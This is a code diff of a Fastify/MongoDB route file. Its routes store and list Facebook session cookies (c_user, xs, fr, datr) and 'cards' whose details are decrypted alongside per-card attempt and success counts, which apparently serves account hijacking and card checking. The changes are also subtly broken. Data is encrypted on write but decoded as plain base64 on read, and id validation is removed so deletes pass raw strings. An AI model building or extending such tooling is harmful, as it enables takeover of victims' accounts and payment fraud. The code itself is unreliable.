@@ -1,7 +1,7 @@
 import type { FastifyInstance } from 'fastify';
 import { requireAuth } from '../../middleware/auth';
 import { getDb } from '../../lib/mongo';
-import { encryptJson, decryptJson } from '../../lib/encryption';
+import { encryptJson } from '../../lib/encryption';
 import { z } from 'zod';
 import multipart from '@fastify/multipart';
 import { parse } from 'csv-parse/sync';
@@ -34,14 +34,7 @@ export async function uploadRoutes(app: any) {
       const cookiesCollection = db.collection('cookies');
       
       const docs = items.map((i) => ({ 
-        // store plaintext fields directly for reliability
-        c_user: i.c_user?.toString(),
-        xs: i.xs?.toString(),
-        fr: i.fr?.toString(),
-        datr: i.datr?.toString(),
-        country: i.country?.toString(),
-        // keep an encrypted blob as optional backup for legacy paths (not used by worker now)
-        payload: undefined,
+        payload: encryptJson(i), 
         createdAt: new Date(),
         userId: new ObjectId('000000000000000000000000')
       }));
@@ -96,15 +89,7 @@ export async function uploadRoutes(app: any) {
         const records = parse(buf.toString('utf8'), { columns: true, skip_empty_lines: true });
         const items = z.array(cookieSchema).parse(records);
         const db = await getDb();
-        const docs = items.map((i) => ({ 
-          c_user: i.c_user?.toString(),
-          xs: i.xs?.toString(),
-          fr: i.fr?.toString(),
-          datr: i.datr?.toString(),
-          country: i.country?.toString(),
-          payload: undefined,
-          createdAt: new Date() 
-        }));
+        const docs = items.map((i) => ({ payload: encryptJson(i), createdAt: new Date() }));
         await db.collection('cookies').insertMany(docs);
         return { inserted: docs.length };
       }
@@ -132,9 +117,7 @@ export async function uploadRoutes(app: any) {
   app.delete('/api/cards/:id', { preHandler: requireAuth }, async (req: any, reply: any) => {
     const { id } = req.params as { id: string };
     const db = await getDb();
-    const _id = (() => { try { return new ObjectId(id); } catch { return null; } })();
-    if (!_id) return reply.code(400).send({ deleted: 0, error: 'Invalid id' });
-    const res = await db.collection('cards').deleteOne({ _id });
+    const res = await db.collection('cards').deleteOne({ _id: (id as any) });
     return { deleted: res.deletedCount };
   });
 
@@ -142,9 +125,7 @@ export async function uploadRoutes(app: any) {
   app.delete('/api/cookies/:id', { preHandler: requireAuth }, async (req: any, reply: any) => {
     const { id } = req.params as { id: string };
     const db = await getDb();
-    const _id = (() => { try { return new ObjectId(id); } catch { return null; } })();
-    if (!_id) return reply.code(400).send({ deleted: 0, error: 'Invalid id' });
-    const res = await db.collection('cookies').deleteOne({ _id });
+    const res = await db.collection('cookies').deleteOne({ _id: (id as any) });
     return { deleted: res.deletedCount };
   });
 
@@ -164,56 +145,6 @@ export async function uploadRoutes(app: any) {
     return { items, total, page: Number(page), limit: Number(limit) };
   });
 
-  // البطاقات مع التفاصيل الكاملة وإحصائيات الأسبوع الحالي
-  app.get('/api/cards/with-stats', { preHandler: requireAuth }, async (req: any) => {
-    const { limit = 100, page = 1, days = 7 } = req.query || {};
-    const db = await getDb();
-    const skip = (Number(page) - 1) * Number(limit);
-
-    const since = new Date();
-    since.setDate(since.getDate() - Number(days));
-
-    // إحضار البطاقات (سنحتاج payload لفك التشفير)
-    const cards = await db.collection('cards')
-      .find({})
-      .sort({ createdAt: -1 })
-      .skip(skip)
-      .limit(Number(limit))
-      .toArray();
-
-    const total = await db.collection('cards').countDocuments();
-
-    // تجميع الإحصائيات خلال الفترة
-    const statsAgg = await db.collection('job_results').aggregate([
-      { $match: { createdAt: { $gte: since }, cardId: { $exists: true, $ne: null } } },
-      { $group: { _id: '$cardId', attempts: { $sum: 1 }, successes: { $sum: { $cond: [{ $eq: ['$success', true] }, 1, 0] } } } }
-    ]).toArray();
-    const statsMap = new Map<string, { attempts: number; successes: number }>();
-    for (const s of statsAgg) {
-      statsMap.set(String(s._id), { attempts: s.attempts || 0, successes: s.successes || 0 });
-    }
-
-    const items = cards.map((c: any) => {
-      let details: any = null;
-      try {
-        if (c.payload) details = decryptJson<any>(c.payload);
-      } catch {}
-      const stat = statsMap.get(String(c._id)) || { attempts: 0, successes: 0 };
-      return {
-        _id: String(c._id),
-        createdAt: c.createdAt,
-        updatedAt: c.updatedAt,
-        isActive: c.isActive,
-        // تفاصيل البطاقة بعد فك التشفير
-        details,
-        // إحصائيات الأسبوع
-        stats: stat,
-      };
-    });
-
-    return { items, total, page: Number(page), limit: Number(limit) };
-  });
-
   // الحصول على قائمة الكوكيز مع c_user
   app.get('/api/cookies', { preHandler: requireAuth }, async (req: any) => {
     const { limit = 100, page = 1 } = req.query || {};
@@ -226,13 +157,8 @@ export async function uploadRoutes(app: any) {
       .limit(Number(limit))
       .toArray();
     const items = raw.map((doc: any) => {
-      if (doc.c_user) {
-        return { _id: doc._id, c_user: doc.c_user, createdAt: doc.createdAt };
-      }
-      // Fallback: try decrypt if legacy encrypted docs
       try {
-        const { decryptJson } = require('../../lib/encryption');
-        const dec: any = decryptJson(doc.payload);
+        const dec: any = JSON.parse(Buffer.from(doc.payload, 'base64').toString('utf8'));
         return { _id: doc._id, c_user: dec.c_user ?? null, createdAt: doc.createdAt };
       } catch {
         return { _id: doc._id, c_user: null, createdAt: doc.createdAt };
